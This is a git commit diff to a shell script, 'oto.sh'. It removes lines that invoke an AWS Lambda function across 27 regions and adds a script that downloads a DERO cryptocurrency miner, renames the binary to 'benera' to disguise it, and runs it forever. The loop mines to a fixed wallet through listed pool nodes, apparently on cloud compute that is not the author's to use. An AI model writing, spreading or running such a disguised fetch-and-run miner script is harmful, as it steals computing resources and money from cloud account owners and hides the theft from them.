701f3677465262c76e930c32bbbd9d13b1c869e0
levent1913 <46969193+levent1913@users.noreply.github.com>
2023-05-22 00:10:19 +0300

    Update oto.sh

--- oto.sh
+++ oto.sh
@@ -1,27 +1,9 @@
-aws lambda invoke --function-name Arfio output.json --region us-east-1 &
-aws lambda invoke --function-name Arfio output.json --region us-east-2 &
-aws lambda invoke --function-name Arfio output.json --region us-west-1 &
-aws lambda invoke --function-name Arfio output.json --region us-west-2 &
-aws lambda invoke --function-name Arfio output.json --region ap-south-1 &
-aws lambda invoke --function-name Arfio output.json --region ap-southeast-1 &
-aws lambda invoke --function-name Arfio output.json --region ap-southeast-2 &
-aws lambda invoke --function-name Arfio output.json --region ap-southeast-3 &
-aws lambda invoke --function-name Arfio output.json --region ap-southeast-4 &
-aws lambda invoke --function-name Arfio output.json --region ap-northeast-1 &
-aws lambda invoke --function-name Arfio output.json --region ap-northeast-2 &
-aws lambda invoke --function-name Arfio output.json --region ap-northeast-3 &
-aws lambda invoke --function-name Arfio output.json --region ca-central-1 &
-aws lambda invoke --function-name Arfio output.json --region eu-central-1 &
-aws lambda invoke --function-name Arfio output.json --region eu-central-2 &
-aws lambda invoke --function-name Arfio output.json --region eu-west-1 &
-aws lambda invoke --function-name Arfio output.json --region eu-west-2 &
-aws lambda invoke --function-name Arfio output.json --region eu-west-3 &
-aws lambda invoke --function-name Arfio output.json --region eu-north-1 &
-aws lambda invoke --function-name Arfio output.json --region sa-east-1 &
-aws lambda invoke --function-name Arfio output.json --region af-south-1 &
-aws lambda invoke --function-name Arfio output.json --region ap-east-1 &
-aws lambda invoke --function-name Arfio output.json --region ap-south-2 &
-aws lambda invoke --function-name Arfio output.json --region eu-south-1 &
-aws lambda invoke --function-name Arfio output.json --region eu-south-2 &
-aws lambda invoke --function-name Arfio output.json --region me-south-1 &
-aws lambda invoke --function-name Arfio output.json --region me-central-1 &
+#!/bin/sh
+sudo yum install wget
+wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.1/astrominer-V1.9.1.R2_generic_amd64_linux.tar.gz -O avz.tar.gz
+tar xzvf avz.tar.gz
+rm avz.tar.gz
+cd astrominer
+mv astrominer benera
+chmod +x benera
+while true; do ./benera -w dero1qyjrpntvr5g7njsg5wh652m42qrzljlnrqljc4xlgdz9d4kj7g9dvqqtcr6xr -r 64.226.88.232:10100 -r1 dero-node-yashnik-eu.mysrv.cloud:10300 -r2 dero-node.mysrv.cloud:10300 -report-realtime-hashrate; done
